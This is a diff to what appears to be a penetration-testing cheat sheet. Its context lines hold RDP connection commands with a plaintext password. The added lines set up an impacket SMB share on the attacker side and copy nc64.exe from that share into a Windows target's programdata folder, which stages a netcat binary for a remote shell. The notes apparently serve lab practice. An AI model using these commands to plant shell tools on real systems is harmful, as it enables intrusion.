@@ -89,4 +89,9 @@ rdesktop -u ed 192.168.0.104 -p 12q -g 1200x900 -x -x80  -r sound:local -r disk:
 # no need to disable net auth
 xfreerdp /u:ed /p:12q /v:192.168.0.104 /w:1200 /h:900 /drive:home,/home/kali 
 
+#### smbserver
+    impacket-smbserver share . -smb2support
 
+//on win
+    net use \\10.10.16.3\   or net use \\10.10.16.3\share 
+    copy \\10.10.16.3\share\nc64.exe \programdata\nc.exe
